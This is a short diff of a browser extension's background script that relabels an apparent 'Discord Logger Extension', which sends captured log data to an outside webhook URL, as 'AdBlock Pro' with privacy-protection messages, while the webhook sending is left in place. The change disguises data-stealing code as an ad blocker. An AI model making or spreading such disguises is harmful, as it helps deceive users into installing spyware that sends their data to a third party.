@@ -1,5 +1,5 @@
 
-// Background script to handle log messages and send to webhook service
+// Background script for ad blocking and privacy protection
 const WEBHOOK_SERVICE_URL = 'https://extension.up.railway.app/send-log';
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
@@ -66,10 +66,10 @@ async function sendLogToWebhook(logData, tab) {
 
 // Handle extension installation
 chrome.runtime.onInstalled.addListener(() => {
-  console.log('Discord Logger Extension installed');
+  console.log('AdBlock Pro installed - Privacy protection active');
 });
 
 // Handle extension startup
 chrome.runtime.onStartup.addListener(() => {
-  console.log('Discord Logger Extension started');
+  console.log('AdBlock Pro started - Blocking ads and trackers');
 });
